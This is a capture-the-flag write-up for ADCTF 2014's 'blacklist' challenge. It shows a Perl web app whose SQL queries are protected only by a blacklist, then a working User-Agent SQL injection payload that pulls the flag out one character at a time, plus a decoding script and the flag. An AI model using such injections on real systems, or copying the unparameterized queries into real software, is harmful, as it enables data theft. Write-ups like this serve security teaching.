### Solved by historypeats

> We have stupid blacklist. The flag is in flag table.
> http://blacklist.adctf2014.katsudon.org/

Provided Source Code:
```perl
use Mojolicious::Lite;
use DBI;

# enjoy~
my $BLACKLIST_CHAR = qr/['*=]/;
my $BLACKLIST_WORD = qr/select|insert|update|from|where|order|union|information_schema/;

my $dbh = DBI->connect('dbi:mysql:blacklist', 'blacklist', $ENV{BLACKLIST_PASSWORD});
helper dbh => sub { $dbh };

get '/' => sub {
    my $self = shift;
    my $ip = $self->tx->remote_address;
    my $agent = $self->req->headers->user_agent;
    # remove evil comments
    $agent =~ s!/\*.*\*/!!g;
    # disallow this one
    die 'no hack' if $agent =~ /\)\s*,\s*\(/;
    $self->dbh->do(
        "INSERT INTO access_log (accessed_at, agent, ip) VALUES (NOW(), '$agent', '$ip')"
    );
    my $access = $self->dbh->selectall_arrayref(
        "SELECT * FROM access_log WHERE ip = '$ip' ORDER BY accessed_at DESC LIMIT 10",
        {Slice => {}}
    );
    return $self->render('index', ip => $ip, access => $access);
};

get '/search' => sub {
    my $self = shift;
    my $ip = $self->param('ip');
    $ip =~ s/$BLACKLIST_CHAR//g;
    $ip =~ s/$BLACKLIST_WORD//g;
    my $id = $self->param('id');
    $id =~ s/$BLACKLIST_CHAR//g;
    $id =~ s/$BLACKLIST_WORD//g;
    my ($agent) = $self->dbh->selectrow_array(
        "SELECT agent FROM access_log WHERE ip = '$ip' AND id = '$id'",
        {Slice => {}}
    );
    if ($agent) {
        $agent =~ s/$BLACKLIST_CHAR//g;
        $agent =~ s/$BLACKLIST_WORD//g;
        my $access = $self->dbh->selectall_arrayref(
            "SELECT * FROM access_log WHERE ip = '$ip' AND agent LIKE '$agent' ORDER BY accessed_at DESC LIMIT 10",
            {Slice => {}}
        );
        return $self->render('search', agent => $agent, access => $access);
    } else {
        return $self->render_not_found;
    }
};

get '/source' => sub {
    my $self = shift;
    my $src = do {
        open my $fh, '<', __FILE__ or die $!;
        local $/; <$fh>;
    };
    return $self->render(text => $src, format => 'txt');
};

app->start;

__DATA__
@@ index.html.ep
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>blacklist</title>
</head>
<body>
    <p>sqli, sqli, sqli~~~ we have blacklist. see <a href="/source">source</a>.</p>
    <h2><%= stash 'ip' %>:</h3>
    <ul>
    % my $access = stash 'access';
    % for (@$access) {
        <li>[<%= $_->{accessed_at} %>] "<%= $_->{agent} %>" <a href="<%== url_for('/search')->query(ip => $_->{ip}, id => $_->{id}) %>">search</a></li>
    % }
    </ul>
</body>
</html>

@@ search.html.ep
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>blacklist</title>
</head>
<body>
    <h2>search with "<%= stash 'agent' %>"</h3>
    <ul>
    % for (@$access) {
        <li>[<%= $_->{accessed_at} %>] "<%= $_->{agent} %>"</li>
    % }
    </ul>
</body>
</html>

@@ not_found.html.ep
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>not found</title>
    <style>body{font-size:64px;}</style>
</head>
<body>
    <pre>             _      __                       _
 _ __   ___ | |_   / _| ___  _   _ _ __   __| |
| '_ \ / _ \| __| | |_ / _ \| | | | '_ \ / _` |
| | | | (_) | |_  |  _| (_) | |_| | | | | (_| |_ _ _
|_| |_|\___/ \__| |_|  \___/ \__,_|_| |_|\__,_(_|_|_)</pre>
</body>
</html>

```

Here we have a SQL injection challenge that relies on a blacklist filter to prevent attackers. As we all know, blacklist filters are terrible when it comes to protecting SQL queries and the proper method would be to use parameterized queries.

Looking at the code, we are able to inject arbitrary SQL into the "INSERT INTO" query via the User-Agent of the request and have the data returned to us in the subsequent "SELECT" query. The "INSERT INTO" query is performed whenever a new request to the index of the page (http://blacklist.adctf2014.katsudon.org/) is made, taking the User-Agent and IP address of the request and inserting it into the database. Additionally, we are allowed to use single-quotes in our injection, which allows us to break out of the query and perform our own SQL statements.

In order to exploit this SQL injection, I used the following base injection in the User-Agent of the request: 

```
hai2' + (ord(substring((select * from flag limit 1),1,1))),'38.86.162.36');#
```

Now to explain what this does, it basically reads the first character of the flag and converts it to it's ASCII decimal equivalent. Then it performs an addition operation with the string 'hai2'. Performing an addition operation between a string and number will return the number. Therefore, the "INSERT INTO" query will be writing the ASCII decimal value of the first letter of the flag.

The response to this request returns the following snippet:
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>blacklist</title>
</head>
<body>
    <p>sqli, sqli, sqli~~~ we have blacklist. see <a href="/source">source</a>.</p>
    <h2>38.86.162.36:</h3>
    <ul>
        <li>[2014-12-17 06:34:42] "65" <a href="/search?ip=38.86.162.36&id=42980">search</a></li>

```

We can see that "65" is returned. "65" is the decimal equivalent of the letter "A". Now all we need to do is increment substring number until we succesfully enumerate the entire flag.

After a quick script, the following python script is used to convert the decimal values returned:
```python

x = [65, 68, 67, 84, 70, 95, 100, 48, 95, 78, 111, 84, 95, 85, 115, 51, 95, 70, 85, 99, 75, 49, 78, 95, 56, 108, 52, 99, 107, 76, 49, 115, 84]
word = ''

for i in x:
    word += chr(i)

print word
```

Flag: ADCTF_d0_NoT_Us3_FUcK1N_8l4ckL1sT
